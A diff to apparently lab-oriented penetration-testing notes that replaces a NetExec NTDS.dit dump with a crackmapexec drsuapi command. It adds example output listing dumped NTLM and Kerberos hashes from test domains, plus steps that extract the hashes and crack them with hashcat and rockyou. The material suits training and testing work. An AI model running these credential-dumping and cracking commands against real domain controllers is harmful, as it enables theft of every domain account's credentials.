@@ -2431,57 +2431,38 @@ We have two options to obtain this file:
 <details>
 <summary><h4>Option 1: Automatic</h4></summary>
 
-Using NetExec to capture NTDS.dit
+Using crackmapexec to capture NTDS.dit
 
 ```bash
-netexec smb <DC IP>  -u <USERNAME> -p <PASSWORD> -M ntdsutil
+crackmapexec smb <DC IP> -u <USER> -p '<PASSWORD>' --ntds drsuapi
 ```
 
 Example output
 
 ```bash
-# SMB         <DC IP>   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:exampledomain.local) (signing:True) (SMBv1:False)
-# SMB         <DC IP>   445     DC01         [+] exampledomain.local\bwilliamson:P@55w0rd! (Pwn3d!)
-# NTDSUTIL    <DC IP>   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
-# NTDSUTIL    <DC IP>   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
-# NTDSUTIL    <DC IP>   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
-# NTDSUTIL    <DC IP>   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
-# NTDSUTIL    <DC IP>   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
-# NTDSUTIL    <DC IP>   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
-# NTDSUTIL    <DC IP>   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
-# NTDSUTIL    <DC IP>   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
-# NTDSUTIL    <DC IP>   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# NTDSUTIL    <DC IP>   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
-# NTDSUTIL    <DC IP>   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
-# NTDSUTIL    <DC IP>   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
-# NTDSUTIL    <DC IP>   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
-# NTDSUTIL    <DC IP>   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
-# NTDSUTIL    <DC IP>   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
-# NTDSUTIL    <DC IP>   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
-# NTDSUTIL    <DC IP>   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
-# NTDSUTIL    <DC IP>   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
-# NTDSUTIL    <DC IP>   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
-# NTDSUTIL    <DC IP>   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
-# NTDSUTIL    <DC IP>   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
-# NTDSUTIL    <DC IP>   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
-# NTDSUTIL    <DC IP>   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
-# NTDSUTIL    <DC IP>   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
-# NTDSUTIL    <DC IP>   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
-# NTDSUTIL    <DC IP>   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
-# NTDSUTIL    <DC IP>   445     DC01         exampledomain.local\jim:des-cbc-md5:79ab08755b32dfb6
-# NTDSUTIL    <DC IP>   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
-# NTDSUTIL    <DC IP>   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
-# NTDSUTIL    <DC IP>   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_<DC IP>_2025-04-25_084640.ntds of which 15 were added to the database
-# NTDSUTIL    <DC IP>   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
-# NTDSUTIL    <DC IP>   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_<DC IP>_2025-04-25_084640.ntds | cut -d ':' -f1
+# [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
+# SMB         <DC IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
+# SMB         <DC IP>   445    ILF-DC01         [+] ILF.local\<USER>:<PASSWORD> (Pwn3d!)
+# SMB         <DC IP>   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
+# SMB         <DC IP>   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+# SMB         <DC IP>   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# SMB         <DC IP>   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
+# SMB         <DC IP>   445    ILF-DC01         ILF.local\<USER>:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
+# SMB         <DC IP>   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
+# SMB         <DC IP>   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
+# SMB         <DC IP>   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
+# SMB         <DC IP>   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ad36b2c78047b7d2b6c64a17225ed0c8:::
+# SMB         <DC IP>   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
+# SMB         <DC IP>   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds of which 7 were added to the database
+# SMB         <DC IP>   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command:
+# SMB         <DC IP>   445    ILF-DC01         [*] cat /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds | grep -iv disabled | cut -d ':' -f1
+# SMB         <DC IP>   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds | cut -d ':' -f1
+```
+
+Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.
+
+```bash
+cat <FILE.NTDS> | cut -d ':' -f4 | sort -u > hashes_ntlm.txt
 ```
 
 </details>
@@ -2585,6 +2566,8 @@ cd ~/ntds
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
+Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.
+
 </details>
 
 </details>
@@ -2597,7 +2580,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 In many of the techniques we've covered, we've successfully cracked the hashes we've obtained.
 
 ```bash
-sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+sudo hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
 ```
 
 But what happens if we're unable to crack a hash?
